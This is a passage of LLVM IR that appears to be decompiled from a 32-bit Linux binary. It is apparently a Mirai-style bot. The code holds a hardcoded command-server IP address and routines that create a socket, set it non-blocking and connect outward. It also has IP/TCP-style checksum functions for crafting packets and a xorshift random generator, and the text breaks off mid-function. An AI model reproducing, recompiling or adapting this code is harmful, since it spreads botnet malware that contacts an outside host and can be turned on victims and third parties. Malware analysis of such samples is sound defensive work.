source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8055010.2 = global i32 0
@global_var_8055028.3 = local_unnamed_addr global i32* @global_var_8055010.2
@global_var_80550d0.5 = local_unnamed_addr global i32 0
@global_var_80550dc.6 = local_unnamed_addr global i32 0
@global_var_80550d4.7 = local_unnamed_addr global i32 0
@global_var_80550d8.8 = local_unnamed_addr global i32 0
@global_var_8055130.9 = local_unnamed_addr global i32 0
@global_var_8055104.10 = local_unnamed_addr global i32 0
@global_var_805515c.11 = local_unnamed_addr global i32 0
@global_var_805510c.12 = local_unnamed_addr global i32 0
@global_var_805510a.13 = local_unnamed_addr global i32 0
@global_var_8055110.14 = local_unnamed_addr global i32 0
@global_var_8055100.15 = global i32 0
@global_var_8055118.17 = local_unnamed_addr global i32 0
@global_var_8055114.18 = global i32 0
@global_var_8055124.19 = local_unnamed_addr global i32 0
@global_var_805517c.20 = local_unnamed_addr global i32 0
@global_var_8055178.21 = local_unnamed_addr global i32 0
@global_var_80550e0.23 = local_unnamed_addr global i32 0
@global_var_8055128.24 = local_unnamed_addr global i32 0
@global_var_80538ed.25 = constant [3 x i8] c"\0D\0A\00"
@global_var_8053842.26 = constant [15 x i8] c"185.55.218.173\00"
@global_var_80551a0.27 = global i32 0
@global_var_8055154.29 = global i32 0
@global_var_80552a0.30 = global i32 0
@global_var_805503c.31 = global i32 0
@global_var_805534c.33 = global i32 0
@global_var_8055350.34 = local_unnamed_addr global i32 0
@global_var_8055354.35 = global i32 0
@global_var_8055360.36 = local_unnamed_addr global i32 0
@global_var_8055654.37 = global i32 0
@global_var_805567c.38 = local_unnamed_addr global i32 0
@global_var_805566c.39 = local_unnamed_addr global i32 0
@global_var_8055670.40 = local_unnamed_addr global i32 0
@global_var_8055674.41 = local_unnamed_addr global i32 0
@global_var_8055678.42 = local_unnamed_addr global i32 0
@global_var_8055684.43 = local_unnamed_addr global i32 0
@global_var_8055690.44 = local_unnamed_addr global i32 0
@global_var_8055688.45 = local_unnamed_addr global i32 0
@global_var_8055694.46 = local_unnamed_addr global i32 0
@global_var_8055668.47 = local_unnamed_addr global i32 0
@global_var_8055664.49 = local_unnamed_addr global i32 0
@global_var_805568c.50 = local_unnamed_addr global i32 0
@global_var_805535c.51 = local_unnamed_addr global i32 0
@global_var_8055054.52 = global i32 0
@global_var_805506c.54 = global i32 0
@global_var_8055138.55 = local_unnamed_addr global i32 0
@global_var_8055004.57 = global i32 -1
@global_var_8052dd3.58 = constant i32 -294069
@global_var_8055148.59 = local_unnamed_addr global i32 0
@global_var_805514c.60 = local_unnamed_addr global i32 0
@global_var_8053ce8.61 = constant [10 x i8] c"/dev/null\00"
@global_var_8055144.63 = local_unnamed_addr global i32 0
@global_var_805513c.64 = local_unnamed_addr global i32 0
@global_var_8055140.65 = local_unnamed_addr global i32 0
@global_var_8053e00.67 = constant i32 33554944
@global_var_8052fb9.68 = constant i32 1928542531
@global_var_8052fdd.69 = constant i32 1928542531
@global_var_8055158.70 = local_unnamed_addr global i32 0
@global_var_8055088.71 = local_unnamed_addr global i32* @global_var_8053e00.67
@global_var_8055698.72 = local_unnamed_addr global i32 0
@global_var_805569c.73 = local_unnamed_addr global i32 0
@global_var_80550a0.1 = local_unnamed_addr global i8 0
@global_var_8055116.16 = local_unnamed_addr global i16 0
@global_var_805512c.22 = local_unnamed_addr global i16 0
@global_var_8055038.28 = local_unnamed_addr global i16 -1105
@global_var_8055320.32 = global i8 0
@global_var_8055680.48 = local_unnamed_addr global i8 0
@global_var_8055134.53 = local_unnamed_addr global i8 0
@global_var_8055150.62 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 53115
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_80537f0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80550a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055028.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055028.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055028.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80550a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055028.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80550a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134561792)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8052e6f(i32 134532800, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134559766, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a19 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a19
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134559766

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d610() local_unnamed_addr {
dec_label_pc_804d610:
  %v0_804d610 = load i32, i32* @global_var_80550d0.5, align 16
  %v0_804d618 = load i32, i32* @global_var_80550dc.6, align 4
  %v2_804d61e = mul i32 %v0_804d610, 2048
  %v2_804d623 = udiv i32 %v0_804d618, 524288
  store i32 %v2_804d623, i32* @ecx, align 4
  %v2_804d626 = xor i32 %v2_804d61e, %v0_804d610
  %v0_804d628 = load i32, i32* @global_var_80550d4.7, align 4
  store i32 %v0_804d628, i32* @global_var_80550d0.5, align 16
  %v0_804d632 = load i32, i32* @global_var_80550d8.8, align 8
  store i32 %v0_804d632, i32* @global_var_80550d4.7, align 4
  store i32 %v0_804d618, i32* @global_var_80550d8.8, align 8
  %v2_804d644 = xor i32 %v2_804d623, %v0_804d618
  %v2_804d646 = udiv i32 %v2_804d626, 256
  %v2_804d649 = xor i32 %v2_804d646, %v2_804d626
  %v2_804d64b = xor i32 %v2_804d649, %v2_804d644
  store i32 %v2_804d64b, i32* @global_var_80550dc.6, align 4
  ret i32 %v2_804d64b

; uselistorder directives
  uselistorder i32 %v2_804d626, { 1, 0 }
  uselistorder i32 %v2_804d623, { 1, 0 }
  uselistorder i32 %v0_804d618, { 1, 2, 0 }
  uselistorder i32 %v0_804d610, { 1, 0 }
}

define i32 @function_804d840() local_unnamed_addr {
dec_label_pc_804d840:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d840 = load i32, i32* @ebx, align 4
  %v0_804d841 = load i32, i32* @eax, align 4
  store i32 %v0_804d841, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d866 = add i32 %v0_804d841, 4
  %v2_804d866 = inttoptr i32 %v1_804d866 to i32*
  %v3_804d866 = load i32, i32* %v2_804d866, align 4
  %v10_804d869 = icmp eq i32 %v3_804d866, -1
  br i1 %v10_804d869, label %dec_label_pc_804d840.dec_label_pc_804d87a_crit_edge, label %dec_label_pc_804d86e

dec_label_pc_804d840.dec_label_pc_804d87a_crit_edge: ; preds = %dec_label_pc_804d840
  br label %dec_label_pc_804d87a

dec_label_pc_804d86e:                             ; preds = %dec_label_pc_804d840
  %v1_804d872 = call i32 @function_8050f63(i32 %v3_804d866)
  br label %dec_label_pc_804d87a

dec_label_pc_804d87a:                             ; preds = %dec_label_pc_804d840.dec_label_pc_804d87a_crit_edge, %dec_label_pc_804d86e
  %v0_804d87a = phi i32 [ -1, %dec_label_pc_804d840.dec_label_pc_804d87a_crit_edge ], [ %v1_804d872, %dec_label_pc_804d86e ]
  store i32 %v0_804d87a, i32* %stack_var_-32, align 4
  %v4_804d881 = call i32 @function_8051747(i32 2, i32 1, i32 0, i32 %v0_804d87a)
  %v1_804d889 = load i32, i32* @ebx, align 4
  %v2_804d889 = add i32 %v1_804d889, 4
  %v3_804d889 = inttoptr i32 %v2_804d889 to i32*
  store i32 %v4_804d881, i32* %v3_804d889, align 4
  %v1_804d88c = add i32 %v4_804d881, 1
  %v8_804d88c = icmp eq i32 %v1_804d88c, 0
  br i1 %v8_804d88c, label %dec_label_pc_804d903, label %dec_label_pc_804d88f

dec_label_pc_804d88f:                             ; preds = %dec_label_pc_804d87a
  store i32 %v1_804d88c, i32* %stack_var_-32, align 4
  %v0_804d891 = load i32, i32* @ebx, align 4
  %v1_804d891 = add i32 %v0_804d891, 28
  store i32 %v1_804d891, i32* @eax, align 4
  %v1_804d899 = add i32 %v0_804d891, 24
  %v2_804d899 = inttoptr i32 %v1_804d899 to i32*
  store i32 0, i32* %v2_804d899, align 4
  %v0_804d8a0 = load i32, i32* @eax, align 4
  %v3_804d8a1 = load i32, i32* %stack_var_-32, align 4
  %v4_804d8a1 = call i32 @function_8050ad0(i32 %v0_804d8a0, i32 256, i32 %v1_804d88c, i32 %v3_804d8a1)
  %v0_804d8a9 = load i32, i32* @ebx, align 4
  %v1_804d8a9 = add i32 %v0_804d8a9, 4
  %v2_804d8a9 = inttoptr i32 %v1_804d8a9 to i32*
  %v3_804d8a9 = load i32, i32* %v2_804d8a9, align 4
  %v3_804d8b1 = call i32 @function_8050ecd(i32 %v3_804d8a9, i32 3, i32 0)
  %v0_804d8b9 = load i32, i32* @ebx, align 4
  %v1_804d8b9 = add i32 %v0_804d8b9, 4
  %v2_804d8b9 = inttoptr i32 %v1_804d8b9 to i32*
  %v3_804d8b9 = load i32, i32* %v2_804d8b9, align 4
  %v12_804d8bc = or i32 %v3_804d8b1, 2048
  %v3_804d8c3 = call i32 @function_8050ecd(i32 %v3_804d8b9, i32 4, i32 %v12_804d8bc)
  %v0_804d8c8 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804d8de = load i32, i32* @global_var_8055130.9, align 16
  %v2_804d8e3 = add i32 %v0_804d8c8, 8
  %v3_804d8e3 = inttoptr i32 %v2_804d8e3 to i32*
  store i32 %v0_804d8de, i32* %v3_804d8e3, align 4
  %v2_804d8e6 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804d8ed = load i32, i32* @ebx, align 4
  %v1_804d8ed = add i32 %v0_804d8ed, 4
  %v2_804d8ed = inttoptr i32 %v1_804d8ed to i32*
  %v3_804d8ed = load i32, i32* %v2_804d8ed, align 4
  store i32 %v3_804d8ed, i32* %edx.global-to-local, align 4
  %v1_804d8f0 = add i32 %v0_804d8ed, 12
  %v2_804d8f0 = inttoptr i32 %v1_804d8f0 to i32*
  store i32 1, i32* %v2_804d8f0, align 4
  %v0_804d8fa = load i32, i32* %edx.global-to-local, align 4
  %v3_804d8fb = call i32 @function_805156c(i32 %v0_804d8fa, i32 %v2_804d8e6, i32 16)
  br label %dec_label_pc_804d903

dec_label_pc_804d903:                             ; preds = %dec_label_pc_804d87a, %dec_label_pc_804d88f
  %v0_804d907 = phi i32 [ %v3_804d8fb, %dec_label_pc_804d88f ], [ 0, %dec_label_pc_804d87a ]
  store i32 %v0_804d840, i32* @ebx, align 4
  ret i32 %v0_804d907

; uselistorder directives
  uselistorder i32 %v3_804d866, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d903, { 1, 0 }
  uselistorder label %dec_label_pc_804d87a, { 1, 0 }
}

define i32 @function_804dde5() local_unnamed_addr {
dec_label_pc_804dde5:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804efdb, %dec_label_pc_804dde5
  %v0_804dde5 = load i32, i32* @global_var_8055130.9, align 16
  store i32 %v0_804dde5, i32* @esi, align 4
  %v0_804ddeb = load i32, i32* @esp, align 4
  %v1_804ddeb = add i32 %v0_804ddeb, 20
  %v2_804ddeb = inttoptr i32 %v1_804ddeb to i32*
  %v3_804ddeb = load i32, i32* %v2_804ddeb, align 4
  %v15_804ddeb = icmp eq i32 %v3_804ddeb, %v0_804dde5
